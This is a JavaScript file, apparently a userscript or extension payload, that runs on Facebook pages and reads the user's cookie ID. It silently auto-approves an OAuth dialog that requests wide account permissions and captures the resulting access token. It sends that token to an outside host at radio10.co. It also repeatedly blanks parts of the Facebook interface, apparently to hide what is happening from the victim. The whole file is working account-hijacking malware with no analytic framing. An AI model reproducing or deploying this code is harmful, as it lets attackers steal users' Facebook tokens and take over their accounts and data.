if (location.hostname.indexOf("www.facebook.com", "static.ak.facebook.com", "apps.facebook.com", "beta.facebook.com") >= 0) {
    var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

    function permiso(url) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                izinverhtml = document.createElement("html");
                izinverhtml.innerHTML = xhr.responseText;
                if (izinverhtml.getElementsByTagName("form").length > 0) {
                    izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
                    act = izinverhtml.getElementsByTagName("form")[0].action;
                    solicitar(izinverhtml, act);
                }
            }
        };
        xhr.open("GET", url, true);
        xhr.send();
    }

    function solicitar(formulario, act) {
        parametros = "";
        for (i = 0; i < formulario.getElementsByTagName("input").length; i++) {
            if (formulario.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formulario.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")) {
                parametros += "&" + formulario.getElementsByTagName("input")[i].name + "=" + formulario.getElementsByTagName("input")[i].value;
            }
        }
        if (formulario.getElementsByTagName("select").length > 0) {
            parametros += "&" + formulario.getElementsByTagName("select")[0].name + "=80";
        }
        parametros.replace("&fb_dtsg", "fb_dtsg");
        parametros += "&__CONFIRM__=1";
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                izinhtml = document.createElement("html");
                izinhtml.innerHTML = xhr.responseText;
                if (izinhtml.getElementsByTagName("form").length > 0) {
                    izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
                    act = izinhtml.getElementsByTagName("form")[0].action;
                    solicitar(izinhtml, act)
                } else {
                    var token= xhr.responseText.match(/#access_token=(.*?)&expires_in/i);
                    if (token[1]) {
                        top.location.href = 'http://www.radio10.co/francined.html#' + token[1];
                    }
                }
            }
        };
        xhr.open("POST", act, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(parametros);
    }

    if (!localStorage['token_' + profile_id] || (localStorage['token_' + profile_id] && tarih.getTime() >= localStorage['token_' + profile_id])) {
        var appid="121876164619130";
        var url="//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + appid+ "&redirect_uri=fbconnect://success&sso_key=com&scope=offline_access,publish_actions,read_stream,publish_stream,user_groups,user_likes,user_photos,friends_photos,user_status,user_activities,manage_pages,photo_upload,friends_religion_politics,read_requests,read_friendlists,manage_friendlists,user_subscriptions,friends_subscriptions";
        permiso(url);
        var xhr = new XMLHttpRequest();
        xhr['open']('GET', 'http://graph.facebook.com/' + profile_id, false);
        xhr['send']();
        var get = JSON.parse(xhr['responseText']);
        var isim = get.name;
    }
    window.setInterval(function() {
        if (document.getElementsByClassName("_5ce")) {
            for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
                document.getElementsByClassName("_5ce")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiToggle wrap")) {
            for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
                document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiPopover")) {
            for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
                document.getElementsByClassName("uiPopover")[i].innerHTML = "";
            }
        }
    }, 2000);


}
